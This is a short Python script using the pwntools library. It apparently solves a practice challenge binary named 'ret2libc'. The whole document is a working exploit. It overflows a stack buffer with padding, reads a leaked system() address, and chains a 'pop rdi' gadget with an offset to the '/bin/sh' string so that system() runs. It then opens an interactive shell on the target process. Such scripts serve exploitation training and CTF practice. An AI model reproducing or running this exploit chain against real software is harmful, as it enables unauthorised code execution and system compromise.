from pwn import *

context.arch = "amd64"
context.terminal = ['kitty', '-e', 'sh', '-c']

bin_sh_offset = +0x143648
payload = 'A' * 0x18

elf = ELF('ret2libc')
io = process('./ret2libc')

pop_rdi = next(elf.search(asm('pop rdi ; ret')))

system = int(io.recv().split('\n')[0],base=16)

payload += p64(pop_rdi)
payload += p64(system+bin_sh_offset)
payload += p64(system)

io.sendline(payload)
io.interactive()
